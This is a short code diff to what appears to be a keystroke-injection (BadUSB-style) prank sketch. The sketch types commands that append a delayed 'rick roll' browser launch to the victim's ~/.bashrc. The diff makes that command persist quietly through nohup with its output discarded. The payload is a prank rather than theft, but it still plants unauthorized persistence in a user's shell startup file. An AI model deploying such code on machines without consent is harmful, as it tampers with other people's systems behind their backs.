@@ -2,7 +2,7 @@
 
 #define ANNOYANCE_LEVEL "600"
 #define RICK_ROLL_LINK "https://archive.org/details/never-gonna-give-you-up-edit-wvm7gv"
-#define RICK_ROLL_COMMAND "sleep $(( $RANDOM % " ANNOYANCE_LEVEL " )) && x-www-browser " RICK_ROLL_LINK " &"
+#define RICK_ROLL_COMMAND "nohup bash -c \"sleep \$(( \$RANDOM % " ANNOYANCE_LEVEL " )) && x-www-browser " RICK_ROLL_LINK "\" > /dev/null 2>&1 &"
 
 void write(const char* msg) {
 
@@ -26,7 +26,7 @@ void setup() {
   write("setxkbmap us");
 
 // install exploit
-  write("echo \"" RICK_ROLL_COMMAND "\" >> ~/.bashrc");
+  write("echo '" RICK_ROLL_COMMAND "' >> ~/.bashrc");
 
   // change keyboard layout back
   write("setxkbmap br, us");
